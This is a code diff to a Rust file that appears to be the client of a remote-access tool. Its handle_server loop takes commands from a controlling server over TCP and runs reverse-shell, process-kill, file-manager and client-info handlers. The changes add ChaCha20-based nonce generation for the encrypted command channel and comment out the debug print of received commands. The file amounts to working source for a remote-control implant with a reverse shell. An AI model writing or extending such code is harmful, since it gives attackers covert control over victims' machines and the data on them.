@@ -2,8 +2,9 @@ use std::net::TcpStream;
 use std::sync::{ Arc, Mutex };
 
 use common::buffers::read_buffer;
-use rand::{ rngs::OsRng, Rng };
+use rand::{ rngs::OsRng, Rng, SeedableRng };
 use std::process;
+use rand_chacha::ChaCha20Rng;
 use crate::{ SECRET, SECRET_INITIALIZED, REVERSE_SHELL };
 
 use common::commands::Command;
@@ -20,11 +21,7 @@ use crate::features::other::{
 };
 use crate::features::process::{ process_list, kill_process };
 
-pub fn handle_server(
-    mut read_stream: TcpStream,
-    mut write_stream: TcpStream,
-    is_connected: Arc<Mutex<bool>>
-) {
+pub fn handle_server(mut read_stream: TcpStream, mut write_stream: TcpStream) {
     OsRng.fill(&mut *SECRET.lock().unwrap());
 
     let mut file_manager = FileManager::new();
@@ -32,28 +29,46 @@ pub fn handle_server(
     let mut reverse_shell_lock = crate::REVERSE_SHELL.lock().unwrap();
 
     loop {
-        let secret_clone = Some(SECRET.lock().unwrap().to_vec());
-        let received_command = read_buffer(&mut read_stream, if
-            SECRET_INITIALIZED.lock().unwrap().clone()
-        {
-            &secret_clone
-        } else {
-            &None
-        });
+        let secret = {
+            if *SECRET_INITIALIZED.lock().unwrap() {
+                Some(SECRET.lock().unwrap().to_vec())
+            } else {
+                None
+            }
+        };
+
+        let received_command = read_buffer(
+            &mut read_stream,
+            &secret,
+            crate::NONCE_READ.lock().unwrap().as_mut()
+        );
 
         match received_command {
             Ok(command) => {
-                println!("Received command: {:?}", command);
+                //println!("Received command: {:?}", command);
                 match command {
                     Command::EncryptionRequest(data) => {
-                        generate_secret(&mut write_stream, data);
+                        let gen_secret = generate_secret(&mut write_stream, data);
+                        let mut seed = [0u8; common::SECRET_LEN];
+                        let vec_secret = Some(gen_secret.to_vec());
+                        seed.copy_from_slice(&vec_secret.as_ref().unwrap()[..]);
+
+                        {
+                            *crate::NONCE_WRITE.lock().unwrap() = Some(
+                                ChaCha20Rng::from_seed(seed)
+                            );
+                            *crate::NONCE_READ.lock().unwrap() = Some(ChaCha20Rng::from_seed(seed));
+                        }
                     }
                     Command::InitClient => {
                         client_info(&mut write_stream, &Some(SECRET.lock().unwrap().to_vec()));
                     }
                     Command::Reconnect => {
                         *crate::SECRET_INITIALIZED.lock().unwrap() = false;
-                        *is_connected.lock().unwrap() = false;
+                        {
+                            let mut is_connected_guard = crate::IS_CONNECTED.lock().unwrap();
+                            *is_connected_guard = false;
+                        }
                         break;
                     }
                     Command::Disconnect => {
@@ -155,7 +170,10 @@ pub fn handle_server(
                 println!("Disconnected!");
                 let mut reverse_shell_lock = REVERSE_SHELL.lock().unwrap();
                 reverse_shell_lock.exit_shell();
-                *is_connected.lock().unwrap() = false;
+                {
+                    let mut is_connected_guard = crate::IS_CONNECTED.lock().unwrap();
+                    *is_connected_guard = false;
+                }
                 break;
             }
         }
